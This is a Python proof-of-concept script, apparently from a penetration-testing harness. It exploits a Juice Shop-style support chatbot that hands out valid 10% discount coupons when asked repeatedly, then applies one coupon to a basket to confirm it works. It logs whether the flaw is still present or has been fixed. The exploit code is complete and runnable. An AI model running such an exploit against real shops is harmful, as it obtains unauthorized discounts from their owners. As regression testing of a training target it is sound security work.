#!/usr/bin/env python3
"""pt37: the support chatbot will hand out a real, working discount
coupon if you just keep asking, no authorization check, no rate
limit, no issuance tracking at all.

Found white-box via the challenge catalog (bullyChatbotChallenge,
"Bully Chatbot", hint: "Just keep asking"). lib/botUtils.ts's
couponCode() unconditionally returns security.generateCoupon(10), the
same unkeyed z85 scheme pt32 forges directly, with nothing gating it.
It's reachable through the bot's normal answer-rotation for its
'queries.couponCode' intent (data/static/botDefaultTrainingData.json):
repeating a coupon-related question eventually lands on the one
canned answer that's actually a function call instead of a refusal
line.

Confirmed live: a fresh test account received a real, working coupon
after 2 repeated requests.

Standard library only (urllib, json).
"""

from __future__ import annotations

import argparse
import json
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt37-001.json"
MAX_ATTEMPTS = 20
COUPON_MARKER = "coupon code for you: "


def _request(method: str, url: str, token: str | None = None, body: dict | None = None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if body is not None:
        req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            text = resp.read()
            return resp.status, (json.loads(text) if text else {})
    except urllib.error.HTTPError as exc:
        try:
            return exc.code, json.loads(exc.read())
        except Exception:
            return exc.code, {}


def _register_and_login(target: str, label: str, stamp: str) -> str:
    email = f"pt37-{label}-{stamp}@flatline.test"
    password = "Pt37Pass123!"
    _request("POST", f"{target}/api/Users", body={"email": email, "password": password, "passwordRepeat": password})
    status, body = _request("POST", f"{target}/rest/user/login", body={"email": email, "password": password})
    if status != 200:
        raise RuntimeError(f"login of {email} failed: HTTP {status}")
    return body["authentication"]["token"]


def run(target: str, blueprint: dict) -> dict:
    ledger.guard_target_host(target)
    stamp = str(int(time.time() * 1000))

    token = _register_and_login(target, "attacker", stamp)
    status, body = _request("POST", f"{target}/rest/chatbot/respond", token=token, body={"action": "setname", "query": "FlatlineBot"})
    if status != 200:
        raise RuntimeError(f"chatbot setname failed: HTTP {status}")
    token = body.get("token", token)

    coupon_code = None
    attempts_taken = 0
    for i in range(MAX_ATTEMPTS):
        attempts_taken = i + 1
        status, body = _request("POST", f"{target}/rest/chatbot/respond", token=token, body={"action": "query", "query": "can I have a coupon code"})
        text = body.get("body", "")
        if COUPON_MARKER in text:
            coupon_code = text.split(COUPON_MARKER, 1)[1].strip()
            break

    coupon_verified_valid = False
    if coupon_code:
        login_status, login_body = _request("POST", f"{target}/rest/user/login", body={"email": f"pt37-attacker-{stamp}@flatline.test", "password": "Pt37Pass123!"})
        bid = str(login_body["authentication"]["bid"])
        encoded = urllib.parse.quote(coupon_code, safe="")
        apply_status, apply_body = _request("PUT", f"{target}/rest/basket/{bid}/coupon/{encoded}", token=token)
        coupon_verified_valid = apply_status == 200 and apply_body.get("discount") == 10

    if coupon_code and coupon_verified_valid:
        status_result = "VULNERABLE"
        summary = f"The chatbot handed out a real, working 10% coupon ({coupon_code}) after {attempts_taken} repeated requests, verified valid by applying it to a basket."
    elif not coupon_code:
        status_result = "REMEDIATED"
        summary = f"No real coupon was received in {MAX_ATTEMPTS} attempts; the bot never produced the coupon-issuing response."
    else:
        status_result = "ERROR"
        summary = f"Inconclusive: coupon_code={coupon_code}, coupon_verified_valid={coupon_verified_valid}."

    # Legitimate case: an unrelated chatbot question still gets a
    # sensible response.
    legit_status, legit_body = _request("POST", f"{target}/rest/chatbot/respond", token=token, body={"action": "query", "query": "how much is apple juice"})
    legitimate_unrelated_query_ok = legit_status == 200 and legit_body.get("action") in ("response", "function")

    return {
        "vulnerability_id": blueprint["vulnerability_id"],
        "mitre_technique": blueprint["mitre_technique"],
        "target": target,
        "status": status_result,
        "attempts_taken": attempts_taken,
        "coupon_received": bool(coupon_code),
        "coupon_verified_valid": coupon_verified_valid,
        "summary": summary,
        "legitimate_unrelated_query_ok": legitimate_unrelated_query_ok,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--target", default=None, help="Overrides the blueprint's target.host, e.g. to point at the proxy instead.")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = args.target or blueprint["target"]["host"]

    result = run(target, blueprint)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt37-chatbot-coupon-leak", **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
